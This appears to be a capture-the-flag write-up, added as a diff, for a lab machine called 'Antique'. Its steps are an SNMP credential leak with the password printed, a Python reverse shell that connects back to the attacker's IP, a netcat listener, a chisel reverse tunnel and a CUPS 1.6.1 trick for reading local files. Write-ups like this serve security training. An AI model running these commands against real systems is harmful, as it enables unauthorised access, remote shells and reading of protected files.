@@ -1,0 +1,88 @@
+# Antique Write-Up
+
+Easy
+
+Tags:
+`SNMP`
+`Chisel`
+`Cups 1.6.1`
+
+
+## Intro
+
+1. Simple Network Monitoring Protocol vulnerability
+2. Python reverse shell
+3. Chisel tunnel to forward port
+4. Cups 1.6.1 vuln - read local file
+
+## Exploit
+
+### Port scanning
+
+```
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet?
+```
+
+### Get telnet password via SNMP vuln
+
+```
+snmpget -v 1 -c public 10.10.11.107 1.3.6.1.4.1.11.2.3.9.1.1.13.0 
+```
+
+Telnet password: `P@ssw0rd@123!!123`
+
+Python shell
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+Netcat listener
+
+```
+nc -lvnp 4444
+```
+
+## Privilege Escalation
+
+```
+netstat -ant
+```
+
+```
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
+tcp        0      0 10.10.11.107:23         10.10.16.5:46726        ESTABLISHED
+tcp        0    150 10.10.11.107:57140      10.10.16.5:1234         ESTABLISHED
+tcp6       0      0 ::1:631                 :::*                    LISTEN
+```
+
+Use `chisel` tunnel. Drop `chisel` for victim, change the access permissions of `chisel` file.
+
+```
+chmod a+x chisel
+```
+
+Run server on attacker
+
+```
+sudo ./chisel server --port 8000 --reverse 
+```
+
+Run client on victim
+
+```
+./chisel client 10.10.16.5:8000 R:631:127.0.0.1:631
+```
+
+Cups 1.6.1 Vuln
+
+```
+cupsctl ErrorLog="<path>"
+```
+
+```
+curl http://localhost:631/admin/log/error_log?
+```
